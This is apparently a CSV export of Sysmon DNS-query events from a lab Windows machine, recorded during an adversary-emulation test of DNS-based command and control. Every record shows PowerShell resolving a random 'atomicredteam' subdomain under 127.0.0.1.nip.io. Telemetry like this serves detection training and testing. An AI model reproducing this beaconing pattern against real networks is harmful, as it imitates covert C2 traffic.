"2025-12-26 11:26:42.119 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174099,"Query: atomicredteam-822860.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:26:41.852","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:26:42.121 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174100,"Query: atomicredteam-140049.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:26:41.905","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:26:43.269 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174101,"Query: atomicredteam-477184.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:26:42.079","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:26:43.269 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174102,"Query: atomicredteam-720088.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:26:42.121","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:26:43.269 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174103,"Query: atomicredteam-21618.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:26:42.168","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:26:43.270 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174104,"Query: atomicredteam-509972.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:26:42.206","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:26:43.270 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174105,"Query: atomicredteam-959595.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:26:42.265","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:26:43.270 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174106,"Query: atomicredteam-122240.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:26:42.325","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:26:43.270 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174107,"Query: atomicredteam-430825.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:26:42.406","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:26:43.270 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174108,"Query: atomicredteam-387111.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:26:42.466","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:26:43.270 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174109,"Query: atomicredteam-678967.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:26:42.518","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:26:43.270 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174110,"Query: atomicredteam-412827.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:26:42.557","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:26:43.270 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174111,"Query: atomicredteam-967278.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:26:42.621","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:26:43.270 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174112,"Query: atomicredteam-83377.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:26:42.831","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:26:43.270 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174113,"Query: atomicredteam-160299.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:26:42.870","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:26:43.271 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174114,"Query: atomicredteam-360837.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:26:42.908","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:26:43.271 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174115,"Query: atomicredteam-687554.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:26:42.947","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:26:43.271 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174116,"Query: atomicredteam-881190.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:26:42.991","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:26:43.271 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174117,"Query: atomicredteam-726895.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:26:43.037","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:26:43.271 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174118,"Query: atomicredteam-404949.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:26:43.076","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:26:44.152 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174119,"Query: atomicredteam-680935.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:26:43.116","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:26:44.152 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174120,"Query: atomicredteam-909355.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:26:43.159","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:26:44.152 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174121,"Query: atomicredteam-594718.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:26:43.201","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:26:44.152 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174122,"Query: atomicredteam-453652.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:26:43.246","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:26:44.152 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174123,"Query: atomicredteam-635907.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:26:43.290","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:26:44.152 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174124,"Query: atomicredteam-271059.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:26:43.330","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:26:44.152 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174125,"Query: atomicredteam-551421.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:26:43.504","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:26:44.152 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174126,"Query: atomicredteam-229278.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:26:43.647","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:26:44.152 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174127,"Query: atomicredteam-892836.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:26:43.688","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:26:44.152 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174128,"Query: atomicredteam-127170.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:26:43.858","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:26:44.152 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174129,"Query: atomicredteam-279572.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:26:43.897","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:26:44.152 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174130,"Query: atomicredteam-860773.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:26:43.935","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:26:44.152 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174131,"Query: atomicredteam-3747.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:26:43.973","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:26:44.152 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174132,"Query: atomicredteam-41869.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:26:44.012","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:26:44.152 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174133,"Query: atomicredteam-600346.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:26:44.051","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:26:45.145 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174134,"Query: atomicredteam-663210.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:26:44.109","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:26:45.145 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174135,"Query: atomicredteam-596341.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:26:44.449","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:26:45.145 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174136,"Query: atomicredteam-814521.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:26:44.527","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:26:45.145 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174137,"Query: atomicredteam-411388.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:26:44.593","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:26:45.145 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174138,"Query: atomicredteam-32071.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:26:44.726","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:26:45.145 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174139,"Query: atomicredteam-90142.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:26:44.934","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:26:45.201 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174140,"Query: atomicredteam-168789.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:26:44.978","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:26:46.269 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174141,"Query: atomicredteam-500569.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:26:45.032","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:26:46.392 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174142,"Query: atomicredteam-900377.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:26:45.071","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:26:46.392 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174143,"Query: atomicredteam-916552.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:26:45.112","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:26:46.392 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174144,"Query: atomicredteam-118251.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:26:45.304","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:26:46.392 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174145,"Query: atomicredteam-892204.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:26:45.346","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:26:46.392 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174146,"Query: atomicredteam-14399.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:26:45.386","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
